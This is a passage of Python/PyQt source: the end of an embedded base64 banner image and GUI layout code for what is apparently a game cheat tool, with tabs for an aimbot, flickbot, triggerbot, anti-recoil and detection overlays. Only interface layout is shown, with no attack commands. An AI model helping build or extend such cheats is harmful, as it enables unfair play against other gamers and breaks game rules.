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"	
        ]
        selected_image = random.choice(image_files)
        image_data = base64.b64decode(selected_image)
        image = QImage()
        image.loadFromData(image_data)
        pixmapdd = QPixmap.fromImage(image)
        self.bannerdd.setPixmap(pixmapdd)
        self.bannerdd.setAlignment(Qt.AlignCenter)
        banner_layout.addWidget(self.bannerdd)

        aimbot_layout = QVBoxLayout()
        aimbot_layout.addWidget(self.Enable_Aim_checkbox)
        aimbot_layout.addWidget(self.Controller_On_checkbox)
        button_container_layout05 = QHBoxLayout()
        button_container_layout05.addWidget(self.hotkey_label)
        button_container_layout05.addWidget(self.btn_hotkey)
        button_container_layout05.addWidget(self.hotkey_label2)
        button_container_layout05.setAlignment(Qt.AlignLeft)
        button_container_layout05.addWidget(self.btn_hotkey2)
        aimbot_layout.addLayout(button_container_layout05)
        aimbot_layout.addSpacing(5)
        aimbot_layout.addWidget(separator_line1)
        aimbot_layout.addSpacing(5)
        button_container_layout00 = QHBoxLayout()
        button_container_layout00.addWidget(self.slider)
        button_container_layout00.addWidget(self.Fov_Size_label)
        aimbot_layout.addLayout(button_container_layout00)
        button_container_layout01 = QHBoxLayout()
        button_container_layout01.addWidget(self.slider0)
        button_container_layout01.addWidget(self.Confidence_label)
        aimbot_layout.addLayout(button_container_layout01)
        button_container_layout03 = QHBoxLayout()
        button_container_layout03.addWidget(self.slider3)
        button_container_layout03.addWidget(self.Aim_Smooth_label)
        aimbot_layout.addLayout(button_container_layout03)
        aimbot_layout.addSpacing(2)
        button_container_layout04 = QHBoxLayout()
        button_container_layout04.addWidget(self.aim_bone_combobox)
        button_container_layout04.addWidget(self.aim_bone_label)
        aimbot_layout.addLayout(button_container_layout04)
        button_container_layout53 = QHBoxLayout()
        button_container_layout53.addWidget(self.smoothing_type_combobox)
        button_container_layout53.addWidget(self.smoothing_type_label)
        aimbot_layout.addLayout(button_container_layout53)
        aimbot_layout.addSpacing(3)
        aimbot_layout.addWidget(self.btn_extraini2)
        aimbot_layout.addSpacing(5)
        aimbot_layout.addWidget(separator_line2)
        aimbot_layout.addWidget(self.Welcome_label_1)

        # config_layout = QVBoxLayout()
        # button_container_layout05 = QHBoxLayout()
        # button_container_layout05.addWidget(self.hotkey_label)
        # button_container_layout05.addWidget(self.btn_hotkey)
        # button_container_layout05.addWidget(self.hotkey_label2)
        # button_container_layout05.setAlignment(Qt.AlignLeft)
        # button_container_layout05.addWidget(self.btn_hotkey2)
        # config_layout.addLayout(button_container_layout05)
        # config_layout.addSpacing(5)
        # config_layout.addWidget(separator_line1)
        # config_layout.addSpacing(5)
        # button_container_layout00 = QHBoxLayout()
        # button_container_layout00.addWidget(self.slider)
        # button_container_layout00.addWidget(self.Fov_Size_label)
        # config_layout.addLayout(button_container_layout00)
        # button_container_layout01 = QHBoxLayout()
        # button_container_layout01.addWidget(self.slider0)
        # button_container_layout01.addWidget(self.Confidence_label)
        # config_layout.addLayout(button_container_layout01)
        # button_container_layout03 = QHBoxLayout()
        # button_container_layout03.addWidget(self.slider3)
        # button_container_layout03.addWidget(self.Aim_Smooth_label)
        # config_layout.addLayout(button_container_layout03)
        # config_layout.addSpacing(2)
        # button_container_layout04 = QHBoxLayout()
        # button_container_layout04.addWidget(self.aim_bone_combobox)
        # button_container_layout04.addWidget(self.aim_bone_label)
        # config_layout.addLayout(button_container_layout04)
        # config_layout.addSpacing(3)
        # config_layout.addWidget(self.btn_extraini2)
        # config_layout.addSpacing(5)
        # config_layout.addWidget(separator_line2)
        # config_layout.addWidget(self.Welcome_label_1)

        slots_layout = QVBoxLayout()
        slots_layout.addWidget(self.Enable_Slots_checkbox)
        # Slot 1
        button_container_layout_slot1 = QHBoxLayout()
        button_container_layout_slot1.addWidget(self.hotkey_label_slot1)
        button_container_layout_slot1.addWidget(self.btn_hotkey_slot1)
        button_container_layout_slot1.addWidget(self.slider_slot1)
        button_container_layout_slot1.addWidget(self.Fov_Size_label_slot1)
        button_container_layout_slot1.addWidget(self.Enable_Aim_Slot1_checkbox)
        button_container_layout_slot1.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot1)
        # Slot 2
        button_container_layout_slot2 = QHBoxLayout()
        button_container_layout_slot2.addWidget(self.hotkey_label_slot2)
        button_container_layout_slot2.addWidget(self.btn_hotkey_slot2)
        button_container_layout_slot2.addWidget(self.slider_slot2)
        button_container_layout_slot2.addWidget(self.Fov_Size_label_slot2)
        button_container_layout_slot2.addWidget(self.Enable_Aim_Slot2_checkbox)
        button_container_layout_slot2.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot2)
        # Slot 3
        button_container_layout_slot3 = QHBoxLayout()
        button_container_layout_slot3.addWidget(self.hotkey_label_slot3)
        button_container_layout_slot3.addWidget(self.btn_hotkey_slot3)
        button_container_layout_slot3.addWidget(self.slider_slot3)
        button_container_layout_slot3.addWidget(self.Fov_Size_label_slot3)
        button_container_layout_slot3.addWidget(self.Enable_Aim_Slot3_checkbox)
        button_container_layout_slot3.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot3)
        # Slot 4
        button_container_layout_slot4 = QHBoxLayout()
        button_container_layout_slot4.addWidget(self.hotkey_label_slot4)
        button_container_layout_slot4.addWidget(self.btn_hotkey_slot4)
        button_container_layout_slot4.addWidget(self.slider_slot4)
        button_container_layout_slot4.addWidget(self.Fov_Size_label_slot4)
        button_container_layout_slot4.addWidget(self.Enable_Aim_Slot4_checkbox)
        button_container_layout_slot4.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot4)
        # Slot 5
        button_container_layout_slot5 = QHBoxLayout()
        button_container_layout_slot5.addWidget(self.hotkey_label_slot5)
        button_container_layout_slot5.addWidget(self.btn_hotkey_slot5)
        button_container_layout_slot5.addWidget(self.slider_slot5)
        button_container_layout_slot5.addWidget(self.Fov_Size_label_slot5)
        button_container_layout_slot5.addWidget(self.Enable_Aim_Slot5_checkbox)
        button_container_layout_slot5.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot5)
        # Slot 6
        button_container_layout_slot6 = QHBoxLayout()
        button_container_layout_slot6.addWidget(self.hotkey_label_slot6)
        button_container_layout_slot6.addWidget(self.btn_hotkey_slot6)
        button_container_layout_slot6.setAlignment(Qt.AlignLeft)
        slots_layout.addLayout(button_container_layout_slot6)

        slots_layout.addSpacing(5)
        slots_layout.addWidget(separator_line14)
        slots_layout.addWidget(self.Welcome_label_7)

        flickbot_layout = QVBoxLayout()
        flickbot_layout.addWidget(self.Enable_Flick_checkbox)
        button_container_layout_flick_key = QHBoxLayout()
        button_container_layout_flick_key.addWidget(self.hotkey_label4)
        button_container_layout_flick_key.setAlignment(Qt.AlignLeft)
        button_container_layout_flick_key.addWidget(self.btn_hotkey4)
        flickbot_layout.addLayout(button_container_layout_flick_key)
        flickbot_layout.addSpacing(5)
        flickbot_layout.addWidget(separator_line11)
        flickbot_layout.addSpacing(5)
        flickbot_layout.addWidget(self.flick_set_info_label)

        button_container_layout_flick_scope = QHBoxLayout()
        button_container_layout_flick_scope.addWidget(self.flick_scope_slider)
        button_container_layout_flick_scope.addWidget(self.flick_scope_label)
        flickbot_layout.addLayout(button_container_layout_flick_scope)

        button_container_layout_flick_cool = QHBoxLayout()
        button_container_layout_flick_cool.addWidget(self.flick_cool_slider)
        button_container_layout_flick_cool.addWidget(self.flick_cool_label)
        flickbot_layout.addLayout(button_container_layout_flick_cool)
        button_container_layout_flick_delay = QHBoxLayout()
        button_container_layout_flick_delay.addWidget(self.flick_delay_slider)
        button_container_layout_flick_delay.addWidget(self.flick_delay_label)
        flickbot_layout.addLayout(button_container_layout_flick_delay)
        flickbot_layout.addSpacing(5)
        flickbot_layout.addWidget(separator_line12)
        flickbot_layout.addWidget(self.Welcome_label_2)

        visual_layout = QVBoxLayout()

        button_container_layout055 = QHBoxLayout()
        # button_container_layout055.addWidget(self.hue_slider)
        # button_container_layout055.addWidget(self.rgb_label)
        visual_layout.addLayout(button_container_layout055)

        button_container_layout06 = QHBoxLayout()
        # button_container_layout06.addWidget(self.lightness_slider)
        # button_container_layout06.addWidget(self.lightness_label)
        visual_layout.addLayout(button_container_layout06)

        button_container_layout07 = QHBoxLayout()
        # button_container_layout07.addWidget(self.opacity_slider)
        # button_container_layout07.addWidget(self.opacity_label)
        visual_layout.addLayout(button_container_layout07)

        # visual_layout.addSpacing(5)
        # visual_layout.addWidget(separator_line3)
        visual_layout.addSpacing(5)
        #visual_layout.addWidget(self.Streamproof_checkbox)
        visual_layout.addWidget(self.Use_Hue_checkbox)
        visual_layout.addWidget(self.Show_Fov_checkbox)
        visual_layout.addWidget(self.Show_Crosshair_checkbox)
        visual_layout.addWidget(self.Show_Detections_checkbox)
        visual_layout.addWidget(self.Show_Aimline_checkbox)
        visual_layout.addWidget(self.Show_FPS_checkbox)
        visual_layout.addWidget(self.Show_Debug_checkbox)
        visual_layout.addWidget(self.Show_CMD_checkbox)

        button_container_layout12 = QHBoxLayout()
        button_container_layout12.addWidget(self.box_type_combobox)
        button_container_layout12.addWidget(self.box_type_label)
        visual_layout.addLayout(button_container_layout12)

        visual_layout.addSpacing(5)
        visual_layout.addWidget(separator_line4)

        # # Add a "Preview" button
        # self.preview_button = QPushButton("Preview")
        # self.preview_button.setStyleSheet(self.get_button_style())
        # visual_layout.addWidget(self.preview_button)
        # visual_layout.addWidget(separator_line4)

        # Connect the button click to a function to open the new window
        #self.preview_button.clicked.connect(self.show_preview_window)
        visual_layout.addWidget(self.Welcome_label_3)


        extra_layout = QVBoxLayout()
        extra_layout.addWidget(self.CupMode_On_checkbox)
        extra_layout.addWidget(self.Enable_TriggerBot_checkbox)
        extra_layout.addWidget(self.Require_Keybind_checkbox)
        button_container_layout08 = QHBoxLayout()
        button_container_layout08.addWidget(self.hotkey_label3)
        button_container_layout08.setAlignment(Qt.AlignLeft)
        button_container_layout08.addWidget(self.btn_hotkey3)
        extra_layout.addLayout(button_container_layout08)
        button_container_layout09 = QHBoxLayout()
        button_container_layout09.addWidget(self.slider5)
        button_container_layout09.addWidget(self.Auto_Fire_Fov_Size_label)
        extra_layout.addLayout(button_container_layout09)
        button_container_layout10 = QHBoxLayout()
        button_container_layout10.addWidget(self.slider6)
        button_container_layout10.addWidget(self.Auto_Fire_Confidence_label)
        extra_layout.addLayout(button_container_layout10)
        extra_layout.addSpacing(5)
        extra_layout.addWidget(separator_line5)
        extra_layout.addSpacing(5)
        extra_layout.addWidget(self.Reduce_Bloom_checkbox)
        extra_layout.addWidget(self.AntiRecoil_On_checkbox)
        extra_layout.addWidget(self.Require_ADS_checkbox) 
        button_container_layout11 = QHBoxLayout()
        button_container_layout11.addWidget(self.slider60)
        button_container_layout11.addWidget(self.AntiRecoil_Strength_label)
        extra_layout.addLayout(button_container_layout11)
        # extra_layout.addSpacing(3)
        # extra_layout.addWidget(self.tempspoof_button)
        extra_layout.addSpacing(5)
        extra_layout.addWidget(separator_line6)
        extra_layout.addWidget(self.Welcome_label_4)

        profile_layout = QVBoxLayout()
        profile_layout.addWidget(self.info_label_3)
        profile_layout.addWidget(self.info_label_4)
        profile_layout.addWidget(self.info_label_5)
        profile_layout.addWidget(self.info_label_6)
